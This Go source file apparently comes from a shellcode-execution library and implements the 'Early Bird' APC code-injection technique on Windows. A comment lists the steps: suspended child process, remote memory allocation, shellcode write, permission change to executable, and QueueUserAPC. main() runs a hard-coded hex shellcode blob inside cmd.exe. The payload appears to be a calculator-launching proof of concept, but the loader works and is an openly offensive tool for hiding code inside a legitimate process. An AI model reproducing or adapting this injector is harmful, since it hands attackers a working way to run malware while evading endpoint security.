// +build windows

// Concept pulled from https://www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered/

/*
	This program executes shellcode in a child process using the following steps:
		1. Create a child proccess in a suspended state with CreateProcessW
		2. Allocate RW memory in the child process with VirtualAllocEx
		3. Write shellcode to the child process with WriteProcessMemory
		4. Change the memory permissions to RX with VirtualProtectEx
		5. Add a UserAPC call that executes the shellcode to the child process with QueueUserAPC
		6. Resume the suspended program with ResumeThread function
*/
package main

import (
	"log"

	sc "github.com/cauefcr/go-shellcode"
)

func main() {
	err := sc.RunSCearlyBird("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3", 2, "C:\\Windows\\System32\\cmd.exe", []string{"/c", "whoami", "/asdfasdf"})
	if err != nil {
		log.Panic(err)
	}
}

// export GOOS=windows GOARCH=amd64;go build -o goEarlyBird.exe cmd/EarlyBird/main.go
